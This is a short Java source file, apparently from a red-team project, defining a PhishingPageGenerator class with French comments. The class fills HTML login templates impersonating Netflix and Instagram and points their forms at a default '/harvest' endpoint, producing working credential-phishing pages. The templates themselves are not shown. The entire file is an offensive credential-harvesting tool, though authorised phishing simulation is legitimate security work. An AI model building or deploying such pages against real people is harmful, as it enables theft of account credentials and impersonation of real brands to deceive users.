package fr.redteam.web;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class PhishingPageGenerator {

    private static final String TEMPLATE_DIR = "/templates/";
    private static final String DEFAULT_TEMPLATE = "login-phishing.html";

    /** Noms des templates disponibles (sans .html) - ordre: 1=Netflix, 2=Instagram */
    public static final String[] TEMPLATE_NAMES = {"netflix", "instagram"};

    /**
     * Génère la page à partir d'un template nommé (ex. "netflix", "instagram").
     */
    public String generateFromTemplate(String templateName, String formAction, String footer) {
        String path = TEMPLATE_DIR + templateName + ".html";
        String template = loadTemplate(path);
        if (template == null || template.isEmpty()) {
            template = loadTemplate(TEMPLATE_DIR + DEFAULT_TEMPLATE);
        }
        if (template == null || template.isEmpty()) return "";
        return applyVars(template, formAction, footer);
    }

    /**
     * Génère la page HTML en remplaçant les placeholders.
     */
    public String generate(String title, String formAction, String footer) {
        String template = loadTemplate(TEMPLATE_DIR + DEFAULT_TEMPLATE);
        if (template == null || template.isEmpty()) return "";
        return applyVars(template, formAction, footer);
    }

    public String generate() {
        return generate("Connexion", "/harvest", "Accès sécurisé.");
    }

    private String applyVars(String template, String formAction, String footer) {
        Map<String, String> vars = new HashMap<>();
        vars.put("{{FORM_ACTION}}", formAction != null ? formAction : "/harvest");
        vars.put("{{FOOTER}}", footer != null ? footer : "");
        String result = template;
        for (Map.Entry<String, String> e : vars.entrySet()) {
            result = result.replace(e.getKey(), e.getValue());
        }
        return result;
    }

    private String loadTemplate(String path) {
        try (InputStream is = getClass().getResourceAsStream(path)) {
            if (is == null || path == null) return "";
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
